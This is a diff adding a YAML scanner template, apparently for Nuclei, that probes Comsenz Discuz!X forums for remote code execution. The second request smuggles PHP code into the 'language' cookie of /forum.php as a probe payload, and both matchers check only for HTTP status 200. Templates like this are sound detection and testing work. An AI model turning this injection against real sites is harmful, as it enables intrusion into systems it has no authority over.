@@ -1,0 +1,29 @@
+id: yaml-poc-comsenz-discuzx-rce-CT-158577
+info:
+  name: Yaml Poc Comsenz Discuzx Rce Ct 158577
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-comsenz-discuzx-rce-CT-158577'
+  tags: rce
+  reference: []
+http:
+- method: GET
+  path:
+  - /forum.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /forum.php
+  headers:
+    Cookie: '{{token}}language=sc''.print(md5({{r1}})).'''
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
